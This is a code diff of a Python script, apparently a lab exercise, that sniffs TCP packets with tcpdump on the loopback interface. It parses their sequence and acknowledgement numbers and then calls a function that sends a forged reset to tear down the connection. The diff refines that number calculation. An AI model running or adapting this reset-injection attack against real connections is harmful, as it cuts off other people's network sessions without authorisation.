@@ -17,7 +17,7 @@ def log_pack(pack):
     info(f"Seq = {pack[TCP].seq}, ACK = {pack[TCP].ack}")
 
 
-def parse(string: str):
+def parse(string: str, begin: bool):
     lis = string.split()
     info(lis)
     to_pos = lis.index('>')
@@ -31,7 +31,11 @@ def parse(string: str):
     seq = 0
     if "seq" in lis:
         to_pos = lis.index("seq")
-        seq = int(lis[to_pos + 1].split(':')[-1].strip(','))
+        if begin:
+            seq = int(lis[to_pos + 1].split(':')[-1].strip(','))
+        else:
+            seq = int(lis[to_pos + 1].split(':')[-1].strip(',')) - int(
+                lis[to_pos + 1].split(':')[0].strip(','))
     return dst, dport, ack, seq
 
 
@@ -56,12 +60,11 @@ def attack(a_addr: (int, int)):
     debug("Getting devices...")
     debug(subprocess.run(["tcpdump", "-D"], capture_output=True).stdout)
     debug(f"Sniff tcp from host {a_addr[0]}, port {a_addr[1]}")
-    cmd = ["tcpdump", "-c", "2", "-i", "lo", f"src {a_addr[0]}", "and", f"src port {a_addr[1]}",
+    cmd = ["tcpdump", "-c", "4", "-i", "lo", f"src {a_addr[0]}", "and", f"src port {a_addr[1]}",
            "and",
            "tcp"]
     proc = subprocess.run(cmd, capture_output=True, check=True)
-    debug("Exception catch")
-    debug("Process terminated")
+    debug("Process finished")
     out = proc.stdout.decode("utf-8").split('\n')
     debug(out)
     debug("Finish sniffing")
@@ -69,12 +72,20 @@ def attack(a_addr: (int, int)):
     seq = 0
     dst = ''
     dport = 0
-    for pack in out:
-        string = pack.strip()
-        if not string:
+    first = out[0].strip()
+    dst, dport, ack, seq = parse(first, True)
+    adding_ack = 0
+    adding_seq = 0
+    while len(out) > 1:
+        cur = out.pop()
+        if not cur:
             continue
-        dst, dport, new_ack, new_seq = parse(string)
-        ack += new_ack
-        seq += new_seq
+        *_, new_ack, new_seq = parse(cur, False)
+        adding_ack = max(new_ack, adding_ack)
+        adding_seq = max(new_seq, adding_seq)
+        if 'seq' in cur:
+            break
+    ack += adding_ack
+    seq += adding_seq
     ack -= 1
     send_rst()
